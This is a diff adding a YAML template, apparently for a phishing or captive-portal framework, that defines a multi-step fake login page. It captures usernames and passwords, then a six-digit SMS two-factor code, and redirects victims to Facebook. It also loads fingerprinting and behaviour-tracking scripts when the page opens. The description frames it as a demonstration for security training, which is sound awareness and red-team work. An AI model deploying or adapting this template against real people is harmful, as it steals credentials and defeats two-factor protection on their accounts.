@@ -1,0 +1,54 @@
+info:
+  name: Example Login 2FA
+  author: Mh4x0f
+  description: A generic login template with two-factor authentication (2FA) simulation, designed to capture both credentials and secondary verification codes. Useful for demonstrating multi-step phishing scenarios in security training.
+  category: social
+  system: true
+  tags:
+    - login
+    - 2FA
+template_dir: login_2fa
+steps:
+  - id: login
+    title: Login Page
+    path: /login
+    method: POST
+    template_file: login.html
+    success_message: Login information received. Proceeding to verification...
+    next: verify
+    capture:
+      enabled: true
+      fields:
+        - name: username
+          required: true
+          validate_regex: ^(?:[a-zA-Z0-9_.-]{3,20}|[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})$
+          error_message: Invalid email or username.
+        - name: password
+          required: true
+          validate_regex: ^.{6,}$
+          error_message: Password too short.
+  - id: verify
+    title: Two-Factor Verification
+    path: /verify
+    method: POST
+    template_file: verify.html
+    success_message: Code accepted. Redirecting to Facebook...
+    next: success
+    capture:
+      enabled: true
+      fields:
+        - name: sms_code
+          required: true
+          validate_regex: ^[0-9]{6}$
+          error_message: Invalid verification code.
+  - id: success
+    title: Success Page
+    path: /login_success.html
+    method: GET
+    template_file: login_successful.html
+    capture:
+      enabled: false
+hooks:
+  onLoad:
+    - /hooks/fingerprint.js
+    - /hooks/behavior.js
